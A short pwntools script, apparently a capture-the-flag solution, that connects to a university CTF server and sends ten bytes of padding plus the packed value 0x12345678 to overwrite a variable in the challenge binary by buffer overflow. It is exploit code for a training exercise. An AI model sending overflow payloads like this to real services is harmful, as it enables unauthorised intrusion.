from pwn import *
import struct

BINARY = ['./chall']
IP, PORT = 'ctf99.cs.ui.ac.id', 10003
LOCAL = False
DEBUG = False
if LOCAL:
    if DEBUG:
        p = gdb.debug(BINARY, '''
        b* main+81
        ''')
    else:
        p = process(BINARY)
else:
    p = remote(IP, PORT)

dummy = b'A' * 10
hack_me_target = 0x12345678
payload = dummy + p64(hack_me_target)
p.sendline(payload)

print(p.recvall().decode())
if LOCAL:
    pause()
